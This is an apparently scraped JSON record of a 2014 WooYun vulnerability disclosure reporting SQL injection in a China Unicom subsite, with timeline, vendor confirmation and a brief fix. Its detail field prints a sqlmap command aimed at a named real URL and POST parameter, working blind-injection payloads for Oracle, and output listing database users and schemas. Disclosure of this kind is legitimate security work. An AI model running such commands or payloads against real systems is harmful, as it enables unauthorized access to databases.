{"id": 1590, "wybug_id": "wooyun-2014-069276", "wybug_title": "联通某子站SQL注入漏洞", "wybug_corp": "中国联通", "wybug_author": "Manning", "wybug_date": "2014-07-22 10:07", "wybug_open_date": "2014-09-05 10:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向公众公开  简要描述： 联通某子站SQL注入漏洞 详细说明：  C:\\Sqlmap>sqlmap.py -u \"http://thqm.wo.com.cn/thqm/searchCy.action\" --data \"content=k\" --dbs --users\n---Place: POSTParameter: content    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: content=k%' AND 7258=7258 AND '%'='    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: content=k%' AND 3977=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(109)||CHR(87)||CHR(72),5) AND '%'='---[08:09:43] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[08:09:43] [INFO] fetching database users[08:09:43] [INFO] fetching number of database users[08:09:43] [INFO] resumed: 22[08:09:43] [INFO] resumed: THQM[08:09:43] [INFO] resumed: SCOTT[08:09:43] [INFO] resumed: MGMT_VIEW[08:09:43] [INFO] resumed: MDDATA[08:09:43] [INFO] resumed: SYSMAN[08:09:43] [INFO] resumed: MDSYS[08:09:43] [INFO] resumed: SI_INFORMTN_SCHEMA[08:09:43] [INFO] resumed: ORDPLUGINS[08:09:43] [INFO] resumed: ORDSYS[08:09:43] [INFO] resumed: OLAPSYS[08:09:43] [INFO] resumed: ANONYMOUS[08:09:43] [INFO] resumed: XDB[08:09:43] [INFO] resumed: CTXSYS[08:09:43] [INFO] resumed: EXFSYS[08:09:43] [INFO] resumed: WMSYS[08:09:43] [INFO] resumed: DBSNMP[08:09:43] [INFO] resumed: TSMSYS[08:09:43] [INFO] resumed: DMSYS[08:09:43] [INFO] resumed: DIP[08:09:43] [INFO] resumed: OUTLN[08:09:44] [INFO] resumed: SYSTEM[08:09:44] [INFO] resumed: SYSdatabase management system users [22]:[*] ANONYMOUS[*] CTXSYS[*] DBSNMP[*] DIP[*] DMSYS[*] EXFSYS[*] MDDATA[*] MDSYS[*] MGMT_VIEW[*] OLAPSYS[*] ORDPLUGINS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SI_INFORMTN_SCHEMA[*] SYS[*] SYSMAN[*] SYSTEM[*] THQM[*] TSMSYS[*] WMSYS[*] XDB[08:09:44] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[08:09:44] [INFO] fetching database (schema) names[08:09:44] [INFO] fetching number of databases[08:09:44] [INFO] resumed: 16[08:09:44] [INFO] resumed: CTXSYS[08:09:44] [INFO] resumed: DBSNMP[08:09:44] [INFO] resumed: DMSYS[08:09:44] [INFO] resumed: EXFSYS[08:09:44] [INFO] resumed: MDSYS[08:09:44] [INFO] resumed: OLAPSYS[08:09:44] [INFO] resumed: ORDSYS[08:09:44] [INFO] resumed: OUTLN[08:09:44] [INFO] resumed: SCOTT[08:09:44] [INFO] resumed: SYS[08:09:44] [INFO] resumed: SYSMAN[08:09:44] [INFO] resumed: SYSTEM[08:09:44] [INFO] resumed: THQM[08:09:44] [INFO] resumed: TSMSYS[08:09:44] [INFO] resumed: WMSYS[08:09:44] [INFO] resumed: XDBavailable databases [16]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] THQM[*] TSMSYS[*] WMSYS[*] XDB\n   漏洞证明：  \n\n   修复方案：  过滤参数   版权声明：转载请注明来源 Manning@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-07-27 08:31 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT直接通报给中国联通集团公司处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-22 14:56 |    \t\tBrick713 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 擅长围观各种漏洞，我就看看，偷摸试试。)\t\t \n  鑫神，你这么找漏洞，我们压力好大！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}